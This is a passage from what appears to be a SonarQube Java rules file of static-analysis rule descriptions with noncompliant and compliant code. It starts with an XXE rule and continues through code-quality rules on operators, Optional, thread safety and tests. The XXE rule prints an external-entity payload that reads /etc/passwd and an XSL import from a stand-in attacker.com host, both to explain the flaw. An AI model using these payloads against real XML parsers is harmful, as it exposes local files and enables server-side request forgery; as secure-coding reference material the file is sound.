            catch (IOException e) {
            logger.LogError(e);
            throw e;
            }
            return sb.toString();
            }
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            public String readFile(File f) throws IOException {
            StringBuilder sb = new StringBuilder();
            FileReader fileReader = new FileReader(fileName);
            BufferedReader bufferedReader = new BufferedReader(fileReader);

            while((line = bufferedReader.readLine()) != null) {
            //...

            return sb.toString();
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
        <tag>error-handling</tag>
        <tag>finding</tag>
        <tag>unused</tag>
    </rule>

    <rule key='S2755' priority='BLOCKER'>
        <configKey>S2755</configKey>
        <name>XML parsers should not be vulnerable to XXE attacks</name>
        <description>
            &lt;p&gt;&lt;a href=&quot;https://www.w3.org/TR/xml/&quot;&gt;XML specification&lt;/a&gt; allows the use of
            entities that can be &lt;a
            href=&quot;https://www.w3.org/TR/xml/#sec-internal-ent&quot;&gt;internal&lt;/a&gt; or &lt;a href=&quot;https://www.w3.org/TR/xml/#sec-external-ent&quot;&gt;external&lt;/a&gt;
            (file system /
            network access ...) which could lead to vulnerabilities such as confidential file disclosures or &lt;a
            href=&quot;https://www.owasp.org/index.php/Server_Side_Request_Forgery&quot;&gt;SSRFs&lt;/a&gt;.&lt;/p&gt;
            &lt;p&gt;Example in this XML document, an external entity read the /etc/passwd file:&lt;/p&gt;
            &lt;pre&gt;
            &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;
            &amp;lt;!DOCTYPE test [
            &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt;
            ]&amp;gt;
            &amp;lt;note xmlns=&quot;http://www.w3schools.com&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&amp;gt;
            &amp;lt;to&amp;gt;&amp;amp;xxe;&amp;lt;/to&amp;gt;
            &amp;lt;from&amp;gt;Jani&amp;lt;/from&amp;gt;
            &amp;lt;heading&amp;gt;Reminder&amp;lt;/heading&amp;gt;
            &amp;lt;body&amp;gt;Don't forget me this weekend!&amp;lt;/body&amp;gt;
            &amp;lt;/note&amp;gt;
            &lt;/pre&gt;
            &lt;p&gt;In this XSL document, network access is allowed which can lead to SSRF vulnerabilities:&lt;/p&gt;
            &lt;pre&gt;
            &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
            &amp;lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.attacker.com/evil.xsl&quot;&amp;gt;
            &amp;lt;xsl:import href=&quot;http://www.attacker.com/evil.xsl&quot;/&amp;gt;
            &amp;lt;xsl:include href=&quot;http://www.attacker.com/evil.xsl&quot;/&amp;gt;
            &amp;lt;xsl:template match=&quot;/&quot;&amp;gt;
            &amp;amp;content;
            &amp;lt;/xsl:template&amp;gt;
            &amp;lt;/xsl:stylesheet&amp;gt;
            &lt;/pre&gt;
            &lt;p&gt;It is recommended to disable access to external entities and network access in general.&lt;/p&gt;
            &lt;p&gt;To protect Java XML Parsers from XXE attacks &lt;a
            href=&quot;https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-94ABC0EE-9DC8-44F0-84AD-47ADD5340477&quot;&gt;these
            properties&lt;/a&gt; have been defined since JAXP 1.5:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; ACCESS_EXTERNAL_DTD: should be set to &quot;&quot; when processing XML/XSD/XLS files (it looks
            for external DOCTYPEs) &lt;/li&gt;
            &lt;li&gt; ACCESS_EXTERNAL_SCHEMA: should be set to &quot;&quot; when processing XML/XSD/XLS files (it looks
            for external schemalocation ect) &lt;/li&gt;
            &lt;li&gt; ACCESS_EXTERNAL_STYLESHEET should be set to &quot;&quot; when processing XLS file (it looks for
            external imports, includes ect); &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Note that &lt;a href=&quot;http://xerces.apache.org/xerces2-j/&quot;&gt;Apache Xerces&lt;/a&gt; is
            still based on JAXP 1.4, therefore one solution is to set to
            &lt;code&gt;false&lt;/code&gt; the &lt;a href=&quot;http://xerces.apache.org/xerces2-j/features.html#external-general-entities&quot;&gt;external-general-entities&lt;/a&gt;
            feature.&lt;/p&gt;
            &lt;p&gt;Avoid FEATURE_SECURE_PROCESSING feature to protect from XXE attacks because depending on the
            implementation:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; it has &lt;a
            href=&quot;https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-88B04BE2-35EF-4F61-B4FA-57A0E9102342&quot;&gt;no
            effect&lt;/a&gt; to protect the parser from XXE attacks but helps guard against excessive memory consumption
            from XML processing. &lt;/li&gt;
            &lt;li&gt; or it's just an obscur shortcut (it could set ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA to
            &quot;&quot; but without guarantee). &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;When setting &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/org/xml/sax/XMLReader.html#setEntityResolver(org.xml.sax.EntityResolver)&quot;&gt;an
            entity
            resolver&lt;/a&gt; to &lt;code&gt;null&lt;/code&gt; (eg: &lt;code&gt;setEntityResolver(null)&lt;/code&gt;)
            the parser will use its own resolution, which is unsafe.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Examples&lt;/h2&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html&quot;&gt;DocumentBuilderFactory&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            String xml = &quot;xxe.xml&quot;;
            DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = df.newDocumentBuilder(); // Noncompliant
            Document document = builder.parse(new InputSource(xml));
            DOMSource domSource = new DOMSource(document);
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html&quot;&gt;SAXParserFactory&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            String xml = &quot;xxe.xml&quot;;
            SaxHandler handler = new SaxHandler();
            SAXParserFactory factory = SAXParserFactory.newInstance();
            SAXParser parser = factory.newSAXParser(); // Noncompliant
            parser.parse(xml, handler);
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html&quot;&gt;XMLInputFactory&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            XMLInputFactory factory = XMLInputFactory.newInstance(); // Noncompliant
            XMLEventReader eventReader = factory.createXMLEventReader(new FileReader(&quot;xxe.xml&quot;));
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html&quot;&gt;TransformerFactory&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            String xslt = &quot;xxe.xsl&quot;;
            String xml = &quot;xxe.xml&quot;;
            TransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance(); //
            Noncompliant
            Transformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));

            StringWriter writer = new StringWriter();
            transformer.transform(new StreamSource(xml), new StreamResult(writer));
            String result = writer.toString();
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html&quot;&gt;SchemaFactory&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            String xsd = &quot;xxe.xsd&quot;;
            StreamSource xsdStreamSource = new StreamSource(xsd);

            SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI); // Noncompliant
            Schema schema = schemaFactory.newSchema(xsdStreamSource);
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html&quot;&gt;Validator&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            String xsd = &quot;xxe.xsd&quot;;
            String xml = &quot;xxe.xml&quot;;
            StreamSource xsdStreamSource = new StreamSource(xsd);
            StreamSource xmlStreamSource = new StreamSource(xml);

            SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
            Schema schema = schemaFactory.newSchema(xsdStreamSource);
            Validator validator = schema.newValidator(); // Noncompliant

            StringWriter writer = new StringWriter();
            validator.validate(xmlStreamSource, new StreamResult(writer));
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://dom4j.github.io/&quot;&gt;Dom4j&lt;/a&gt; library:&lt;/p&gt;
            &lt;pre&gt;
            SAXReader xmlReader = new SAXReader(); // Noncompliant by default
            Document xmlResponse = xmlReader.read(xml);
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;http://www.jdom.org/&quot;&gt;Jdom2&lt;/a&gt; library:&lt;/p&gt;
            &lt;pre&gt;
            SAXBuilder builder = new SAXBuilder(); // Noncompliant by default
            Document document = builder.build(new File(xml));
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html&quot;&gt;DocumentBuilderFactory&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            String xml = &quot;xxe.xml&quot;;
            DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();
            df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;); // Compliant
            df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;); // compliant
            DocumentBuilder builder = df.newDocumentBuilder();
            Document document = builder.parse(new InputSource(xml));
            DOMSource domSource = new DOMSource(document);
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html&quot;&gt;SAXParserFactory&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            String xml = &quot;xxe.xml&quot;;
            SaxHandler handler = new SaxHandler();
            SAXParserFactory factory = SAXParserFactory.newInstance();
            SAXParser parser = factory.newSAXParser();
            parser.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;); // Compliant
            parser.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;); // compliant
            parser.parse(xml, handler);
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html&quot;&gt;XMLInputFactory&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            XMLInputFactory factory = XMLInputFactory.newInstance();
            factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;); // Compliant
            factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;); // compliant

            XMLEventReader eventReader = factory.createXMLEventReader(new FileReader(&quot;xxe.xml&quot;));
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html&quot;&gt;TransformerFactory&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            String xslt = &quot;xxe.xsl&quot;;
            String xml = &quot;xxe.xml&quot;;
            TransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance();
            transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;); // Compliant
            transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;); // Compliant
            // ACCESS_EXTERNAL_SCHEMA not supported in several TransformerFactory implementations
            Transformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));

            StringWriter writer = new StringWriter();
            transformer.transform(new StreamSource(xml), new StreamResult(writer));
            String result = writer.toString();
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html&quot;&gt;SchemaFactory&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            String xsd = &quot;xxe.xsd&quot;;
            StreamSource xsdStreamSource = new StreamSource(xsd);

            SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
            schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;); // Compliant
            schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;); // Compliant
            Schema schema = schemaFactory.newSchema(xsdStreamSource);
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html&quot;&gt;Validator&lt;/a&gt;
            library:&lt;/p&gt;
            &lt;pre&gt;
            String xsd = &quot;xxe.xsd&quot;;
            String xml = &quot;xxe.xml&quot;;
            StreamSource xsdStreamSource = new StreamSource(xsd);
            StreamSource xmlStreamSource = new StreamSource(xml);

            SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
            Schema schema = schemaFactory.newSchema(xsdStreamSource);
            schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);
            schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);
            // validators will also inherit of these properties
            Validator validator = schema.newValidator();

            validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;); // Compliant
            validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;); // Compliant

            StringWriter writer = new StringWriter();
            validator.validate(xmlStreamSource, new StreamResult(writer));
            &lt;/pre&gt;
            &lt;p&gt;For &lt;a href=&quot;https://dom4j.github.io/&quot;&gt;dom4j&lt;/a&gt; library, ACCESS_EXTERNAL_DTD
            and ACCESS_EXTERNAL_SCHEMA are not supported, thus a very strict fix
            is to disable doctype declarations:&lt;/p&gt;
            &lt;pre&gt;
            SAXReader xmlReader = new SAXReader();
            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); // Compliant
            Document xmlResponse = xmlReader.read(xml);
            &lt;/pre&gt;
            &lt;p&gt;&lt;a href=&quot;http://www.jdom.org/&quot;&gt;Jdom2&lt;/a&gt; library:&lt;/p&gt;
            &lt;pre&gt;
            SAXBuilder builder = new SAXBuilder(); // Compliant
            builder.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;); // Compliant
            builder.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;); // Compliant
            Document document = builder.build(new File(xml));
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)&quot;&gt;OWASP
            Top 10 2017 Category A4&lt;/a&gt; - XML External Entities
            (XXE) &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java&quot;&gt;OWASP
            XXE Prevention Cheat
            Sheet&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/611.html&quot;&gt;MITRE, CWE-611&lt;/a&gt;
            - Information Exposure Through XML External Entity Reference &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/827.html&quot;&gt;MITRE, CWE-827&lt;/a&gt;
            - Improper Control of Document Type Definition &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a4</tag>
        <securityStandards>
            <cwe>611,827</cwe>
            <OWASP>A4</OWASP>
        </securityStandards>
    </rule>

    <rule key='S2757' priority='MAJOR'>
        <configKey>S2757</configKey>
        <name>&quot;=+&quot; should not be used instead of &quot;+=&quot;</name>
        <description>
            &lt;p&gt;The use of operators pairs ( &lt;code&gt;=+&lt;/code&gt;, &lt;code&gt;=-&lt;/code&gt; or &lt;code&gt;=!&lt;/code&gt;
            ) where the reversed, single operator was meant (&lt;code&gt;+=&lt;/code&gt;,
            &lt;code&gt;-=&lt;/code&gt; or &lt;code&gt;!=&lt;/code&gt;) will compile and run, but not produce the
            expected results.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when &lt;code&gt;=+&lt;/code&gt;, &lt;code&gt;=-&lt;/code&gt;, or &lt;code&gt;=!&lt;/code&gt;
            is used without any spacing between the two operators and when
            there is at least one whitespace character after.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int target = -5;
            int num = 3;

            target =- num; // Noncompliant; target = -3. Is that really what's meant?
            target =+ num; // Noncompliant; target = 3
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            int target = -5;
            int num = 3;

            target = -num; // Compliant; intent to assign inverse value of num is clear
            target += num;
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2761' priority='MAJOR'>
        <configKey>S2761</configKey>
        <name>Unary prefix operators should not be repeated</name>
        <description>
            &lt;p&gt;The needless repetition of an operator is usually a typo. There is no reason to write &lt;code&gt;!!!i&lt;/code&gt;
            when &lt;code&gt;!i&lt;/code&gt; will do.&lt;/p&gt;
            &lt;p&gt;On the other hand, the repetition of increment and decrement operators may have been done on
            purpose, but doing so obfuscates the meaning, and
            should be simplified.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue for sequences of: &lt;code&gt;!&lt;/code&gt;, &lt;code&gt;~&lt;/code&gt;,
            &lt;code&gt;-&lt;/code&gt;, and &lt;code&gt;+&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int i = 1;

            int j = - - -i; // Noncompliant; just use -i
            int k = ~~~i; // Noncompliant; same as i
            int m = + +i; // Noncompliant; operators are useless here

            boolean b = false;
            boolean c = !!!b; // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            int i = 1;

            int j = -i;
            int k = ~i;
            int m = i;

            boolean b = false;
            boolean c = !b;
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Overflow handling for GWT compilation using &lt;code&gt;~~&lt;/code&gt; is ignored.&lt;/p&gt;
        </description>
    </rule>

    <rule key='S2786' priority='MINOR'>
        <configKey>S2786</configKey>
        <name>Nested &quot;enum&quot;s should not be declared static</name>
        <description>
            &lt;p&gt;According to &lt;a href=&quot;http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.9&quot;&gt;the
            Java Language Specification-8.9&lt;/a&gt;:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;Nested enum types are implicitly &lt;code&gt;static&lt;/code&gt;.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;So there's no need to declare them &lt;code&gt;static&lt;/code&gt; explicitly.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Flower {
            static enum Color { // Noncompliant; static is redundant here
            RED, YELLOW, BLUE, ORANGE
            }

            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Flower {
            enum Color { // Compliant
            RED, YELLOW, BLUE, ORANGE
            }

            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S2789' priority='MAJOR'>
        <configKey>S2789</configKey>
        <name>&quot;null&quot; should not be used with &quot;Optional&quot;</name>
        <description>
            &lt;p&gt;The concept of &lt;code&gt;Optional&lt;/code&gt; is that it will be used when &lt;code&gt;null&lt;/code&gt;
            could cause errors. In a way, it replaces &lt;code&gt;null&lt;/code&gt;,
            and when &lt;code&gt;Optional&lt;/code&gt; is in use, there should never be a question of returning or
            receiving &lt;code&gt;null&lt;/code&gt; from a call.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething () {
            Optional&amp;lt;String&amp;gt; optional = getOptional();
            if (optional != null) { // Noncompliant
            // do something with optional...
            }
            Optional&amp;lt;String&amp;gt; text = null; // Noncompliant, a variable whose type is Optional should never
            itself be null
            // ...
            }

            @Nullable // Noncompliant
            public Optional&amp;lt;String&amp;gt; getOptional() {
            // ...
            return null; // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething () {
            Optional&amp;lt;String&amp;gt; optional = getOptional();
            optional.ifPresent(
            // do something with optional...
            );
            Optional&amp;lt;String&amp;gt; text = Optional.empty();
            // ...
            }

            public Optional&amp;lt;String&amp;gt; getOptional() {
            // ...
            return Optional.empty();
            }
            &lt;/pre&gt;
        </description>
        <tag>java8</tag>
    </rule>

    <rule key='S2864' priority='MAJOR'>
        <configKey>S2864</configKey>
        <name>&quot;entrySet()&quot; should be iterated when both the key and value are needed</name>
        <description>
            &lt;p&gt;When only the keys from a map are needed in a loop, iterating the &lt;code&gt;keySet&lt;/code&gt;
            makes sense. But when both the key and the value are needed,
            it's more efficient to iterate the &lt;code&gt;entrySet&lt;/code&gt;, which will give access to both the key
            and value, instead.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomethingWithMap(Map&amp;lt;String,Object&amp;gt; map) {
            for (String key : map.keySet()) { // Noncompliant; for each key the value is retrieved
            Object value = map.get(key);
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomethingWithMap(Map&amp;lt;String,Object&amp;gt; map) {
            for (Map.Entry&amp;lt;String,Object&amp;gt; entry : map.entrySet()) {
            String key = entry.getKey();
            Object value = entry.getValue();
            // ...
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S2885' priority='MAJOR'>
        <configKey>S2885</configKey>
        <name>Non-thread-safe fields should not be static</name>
        <description>
            &lt;p&gt;Not all classes in the standard Java library were written to be thread-safe. Using them in a
            multi-threaded manner is highly likely to cause data
            problems or exceptions at runtime.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when an instance of &lt;code&gt;Calendar&lt;/code&gt;, &lt;code&gt;DateFormat&lt;/code&gt;,
            &lt;code&gt;javax.xml.xpath.XPath&lt;/code&gt;, or
            &lt;code&gt;javax.xml.validation.SchemaFactory&lt;/code&gt; is marked &lt;code&gt;static&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            private static SimpleDateFormat format = new SimpleDateFormat(&quot;HH-mm-ss&quot;); // Noncompliant
            private static Calendar calendar = Calendar.getInstance(); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            private SimpleDateFormat format = new SimpleDateFormat(&quot;HH-mm-ss&quot;);
            private Calendar calendar = Calendar.getInstance();
            &lt;/pre&gt;
        </description>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2886' priority='MAJOR'>
        <configKey>S2886</configKey>
        <name>Getters and setters should be synchronized in pairs</name>
        <description>
            &lt;p&gt;When one part of a getter/setter pair is &lt;code&gt;synchronized&lt;/code&gt; the other part
            should be too. Failure to synchronize both sides of a pair may
            result in inconsistent behavior at runtime as callers access an inconsistent method state.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when either the method or the contents of one method in a getter/setter
            pair are synchrnoized but the other is not.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Person {
            String name;
            int age;

            public synchronized void setName(String name) {
            this.name = name;
            }

            public String getName() { // Noncompliant
            return this.name;
            }

            public void setAge(int age) { // Noncompliant
            this.age = age;
            }

            public int getAge() {
            synchronized (this) {
            return this.age;
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Person {
            String name;
            int age;

            public synchronized void setName(String name) {
            this.name = name;
            }

            public synchronized String getName() {
            return this.name;
            }

            public void setAge(int age) {
            synchronized (this) {
            this.age = age;
            }
            }

            public int getAge() {
            synchronized (this) {
            return this.age;
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/4jdGBQ&quot;&gt;CERT, VNA01-J.&lt;/a&gt; -
            Ensure visibility of shared references to immutable objects &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2912' priority='MINOR'>
        <configKey>S2912</configKey>
        <name>&quot;indexOf&quot; checks should use a start position</name>
        <description>
            &lt;p&gt;One thing that makes good code good is the clarity with which it conveys the intent of the original
            programmer to maintainers, and the proper
            choice of &lt;code&gt;indexOf&lt;/code&gt; methods can help move code from confusing to clear.&lt;/p&gt;
            &lt;p&gt;If you need to see whether a substring is located beyond a certain point in a string, you can test
            the &lt;code&gt;indexOf&lt;/code&gt; the substring versus
            the target point, or you can use the version of &lt;code&gt;indexOf&lt;/code&gt; which takes a starting
            point argument. The latter is arguably clearer because the
            result is tested against -1, which is an easily recognizable &quot;not found&quot; indicator.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String name = &quot;ismael&quot;;

            if (name.indexOf(&quot;ae&quot;) &amp;gt; 2) { // Noncompliant
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String name = &quot;ismael&quot;;

            if (name.indexOf(&quot;ae&quot;, 2) &amp;gt; -1) {
            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S2924' priority='MINOR'>
        <configKey>S2924</configKey>
        <name>JUnit rules should be used</name>
        <description>
            &lt;p&gt;While some &lt;code&gt;TestRule&lt;/code&gt; classes have the desired effect without ever being
            directly referenced by a test, several others do not, and
            there's no reason to leave them cluttering up the file if they're not in use.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when &lt;code&gt;Test&lt;/code&gt; class fields of the following types
            aren't used by any of the test methods:
            &lt;code&gt;TemporaryFolder&lt;/code&gt;, and &lt;code&gt;TestName&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;This rule also applies to the JUnit 5 equivalent classes: &lt;code&gt;TempDir&lt;/code&gt;, and
            &lt;code&gt;TestInfo&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class ProjectDefinitionTest {

            @Rule
            public TemporaryFolder temp = new TemporaryFolder(); // Noncompliant

            @Test
            public void shouldSetKey() {
            ProjectDefinition def = ProjectDefinition.create();
            def.setKey(&quot;mykey&quot;);
            assertThat(def.getKey(), is(&quot;mykey&quot;));
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class ProjectDefinitionTest {

            @Test
            public void shouldSetKey() {
            ProjectDefinition def = ProjectDefinition.create();
            def.setKey(&quot;mykey&quot;);
            assertThat(def.getKey(), is(&quot;mykey&quot;));
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
        <tag>unused</tag>
    </rule>

    <rule key='S2925' priority='MAJOR'>
        <configKey>S2925</configKey>
        <name>&quot;Thread.sleep&quot; should not be used in tests</name>
        <description>
            &lt;p&gt;Using &lt;code&gt;Thread.sleep&lt;/code&gt; in a test is just generally a bad idea. It creates
            brittle tests that can fail unpredictably depending on
            environment (&quot;Passes on my machine!&quot;) or load. Don't rely on timing (use mocks) or use libraries
            such as &lt;code&gt;Awaitility&lt;/code&gt; for asynchroneous
            testing. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            public void testDoTheThing(){

            MyClass myClass = new MyClass();
            myClass.doTheThing();

            Thread.sleep(500); // Noncompliant
            // assertions...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            public void testDoTheThing(){

            MyClass myClass = new MyClass();
            myClass.doTheThing();

            await().atMost(2, Duration.SECONDS).until(didTheThing()); // Compliant
            // assertions...
            }

            private Callable&amp;lt;Boolean&amp;gt; didTheThing() {
            return new Callable&amp;lt;Boolean&amp;gt;() {
            public Boolean call() throws Exception {
            // check the condition that must be fulfilled...
            }
            };
            }
            &lt;/pre&gt;
        </description>
        <tag>bad-practice</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S2970' priority='BLOCKER'>
        <configKey>S2970</configKey>
        <name>Assertions should be complete</name>
        <description>
            &lt;p&gt;It is very easy to write incomplete assertions when using some test frameworks. This rule enforces
            complete assertions in the following cases:&lt;/p&gt;
            &lt;ul&gt;
